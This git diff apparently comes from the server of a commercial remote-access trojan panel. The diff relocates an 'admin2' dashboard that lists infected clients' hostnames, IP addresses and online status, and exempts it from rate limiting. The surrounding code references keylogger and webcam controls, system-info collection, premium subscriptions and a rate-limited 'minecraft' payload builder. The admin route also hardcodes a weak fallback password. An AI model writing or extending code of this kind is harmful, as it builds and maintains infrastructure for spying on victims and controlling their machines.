@@ -91,101 +91,6 @@ app.use((req, res, next) => {
   next();
 });
 
-// ---------- admin2 — global fleet stats ----------
-
-const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Shit123';
-const ADMIN2_COOKIE   = 'a2_token';
-
-const limitAdmin2Login = limit({
-  windowMs: 15 * 60_000, max: 5,
-  message: { error: 'locked — try again later' },
-});
-const limitAdmin2Api = limit({
-  windowMs: 60_000, max: 120,
-  message: { error: 'too many requests' },
-});
-
-function requireAdmin2(req, res, next) {
-  const token = req.cookies?.[ADMIN2_COOKIE];
-  if (!token) return res.status(401).json({ error: 'unauthorized' });
-  try {
-    const payload = jwt.verify(token, CFG.jwtSecret);
-    if (!payload || payload.admin2 !== true) return res.status(401).json({ error: 'unauthorized' });
-    next();
-  } catch {
-    res.status(401).json({ error: 'unauthorized' });
-  }
-}
-
-app.post('/api/admin2/login', limitAdmin2Login, (req, res) => {
-  const { password } = req.body || {};
-  if (typeof password !== 'string' || password.length === 0 || password.length > 256) {
-    return res.status(400).json({ error: 'bad request' });
-  }
-
-  // constant-time compare — no length oracle for the caller
-  const expected = Buffer.from(ADMIN2_PASSWORD, 'utf8');
-  const given    = Buffer.from(password, 'utf8');
-  const sameLen  = expected.length === given.length;
-  const cmp = sameLen && crypto.timingSafeEqual(expected, given);
-  if (!cmp) return res.status(403).json({ error: 'forbidden' });
-
-  const token = jwt.sign({ admin2: true }, CFG.jwtSecret, { expiresIn: '12h' });
-  res.cookie(ADMIN2_COOKIE, token, {
-    httpOnly: true,
-    sameSite: 'strict',
-    secure: CFG.cookieSecure,
-    maxAge: 12 * 3600 * 1000,
-    path: '/',
-  });
-  res.json({ ok: true });
-});
-
-app.post('/api/admin2/logout', (req, res) => {
-  res.clearCookie(ADMIN2_COOKIE, { path: '/' });
-  res.json({ ok: true });
-});
-
-app.get('/api/admin2/me', limitAdmin2Api, requireAdmin2, (req, res) => {
-  res.setHeader('Cache-Control', 'no-store');
-  res.json({ ok: true });
-});
-
-app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
-  res.setHeader('Cache-Control', 'no-store');
-
-  const now = Date.now();
-  const cutoff = now - 30_000;
-
-  const totalRow   = db.prepare(`SELECT COUNT(*) AS n FROM clients`).get();
-  const onlineRow  = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`).get(cutoff);
-  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`).get(cutoff);
-
-  const rows = db.prepare(`
-    SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
-    FROM clients c
-    JOIN users u ON u.id = c.user_id
-    ORDER BY c.last_seen DESC
-    LIMIT 500
-  `).all();
-
-  res.json({
-    total:   Number(totalRow.n),
-    online:  Number(onlineRow.n),
-    offline: Number(offlineRow.n),
-    rows: rows.map(r => ({
-      id: r.id,
-      hostname: r.hostname,
-      ip: r.ip,
-      username: r.username,
-      online: now - r.last_seen < 30_000,
-      lastSeen: r.last_seen,
-    })),
-  });
-});
-
-
-
 app.post('/api/rpc',
   express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
   (req, res) => {
@@ -209,6 +114,7 @@ app.use((req, res, next) => {
 });
 
 const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
+
 const limitGlobal = limit({
   windowMs: 60_000, max: 600,
   message: { error: 'too many requests' },
@@ -223,7 +129,8 @@ const limitGlobal = limit({
     req.path.endsWith('/webcam/stop') ||
     req.path.endsWith('/keylog/stop') ||
     req.path.endsWith('/sysinfo') ||
-    req.path.startsWith('/api/build/minecraft/progress/'),
+    req.path.startsWith('/api/build/minecraft/progress/') ||
+    req.path === '/api/admin2/stats',
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
@@ -231,6 +138,7 @@ const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error:
 const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
 const limitMcBuild  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'minecraft build limit — 5 per hour' } });
 const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });
+
 app.use(limitGlobal);
 
 const sql = (strings, ...vals) => {
@@ -1155,6 +1063,98 @@ app.post('/api/admin/remove', limitAdmin, (req, res) => {
 
   db.prepare(sql`UPDATE users SET premium_until = 0 WHERE id = ?`).run(user.id);
   res.json({ ok: true, message: 'Premium removed successfully' });
+});
+
+// ---------- admin2 — global fleet stats ----------
+
+const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Shit123';
+const ADMIN2_COOKIE   = 'a2_token';
+
+const limitAdmin2Login = limit({
+  windowMs: 15 * 60_000, max: 5,
+  message: { error: 'locked — try again later' },
+});
+const limitAdmin2Api = limit({
+  windowMs: 60_000, max: 120,
+  message: { error: 'too many requests' },
+});
+
+function requireAdmin2(req, res, next) {
+  const token = req.cookies?.[ADMIN2_COOKIE];
+  if (!token) return res.status(401).json({ error: 'unauthorized' });
+  try {
+    const payload = jwt.verify(token, CFG.jwtSecret);
+    if (!payload || payload.admin2 !== true) return res.status(401).json({ error: 'unauthorized' });
+    next();
+  } catch {
+    res.status(401).json({ error: 'unauthorized' });
+  }
+}
+
+app.post('/api/admin2/login', limitAdmin2Login, (req, res) => {
+  const { password } = req.body || {};
+  if (typeof password !== 'string' || password.length === 0 || password.length > 256) {
+    return res.status(400).json({ error: 'bad request' });
+  }
+
+  const expected = Buffer.from(ADMIN2_PASSWORD, 'utf8');
+  const given    = Buffer.from(password, 'utf8');
+  const sameLen  = expected.length === given.length;
+  const cmp = sameLen && crypto.timingSafeEqual(expected, given);
+  if (!cmp) return res.status(403).json({ error: 'forbidden' });
+
+  const token = jwt.sign({ admin2: true }, CFG.jwtSecret, { expiresIn: '12h' });
+  res.cookie(ADMIN2_COOKIE, token, {
+    httpOnly: true,
+    sameSite: 'strict',
+    secure: CFG.cookieSecure,
+    maxAge: 12 * 3600 * 1000,
+    path: '/',
+  });
+  res.json({ ok: true });
+});
+
+app.post('/api/admin2/logout', (req, res) => {
+  res.clearCookie(ADMIN2_COOKIE, { path: '/' });
+  res.json({ ok: true });
+});
+
+app.get('/api/admin2/me', limitAdmin2Api, requireAdmin2, (req, res) => {
+  res.setHeader('Cache-Control', 'no-store');
+  res.json({ ok: true });
+});
+
+app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
+  res.setHeader('Cache-Control', 'no-store');
+
+  const now = Date.now();
+  const cutoff = now - 30_000;
+
+  const totalRow   = db.prepare(`SELECT COUNT(*) AS n FROM clients`).get();
+  const onlineRow  = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`).get(cutoff);
+  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`).get(cutoff);
+
+  const rows = db.prepare(`
+    SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
+    FROM clients c
+    JOIN users u ON u.id = c.user_id
+    ORDER BY c.last_seen DESC
+    LIMIT 500
+  `).all();
+
+  res.json({
+    total:   Number(totalRow.n),
+    online:  Number(onlineRow.n),
+    offline: Number(offlineRow.n),
+    rows: rows.map(r => ({
+      id: r.id,
+      hostname: r.hostname,
+      ip: r.ip,
+      username: r.username,
+      online: now - r.last_seen < 30_000,
+      lastSeen: r.last_seen,
+    })),
+  });
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
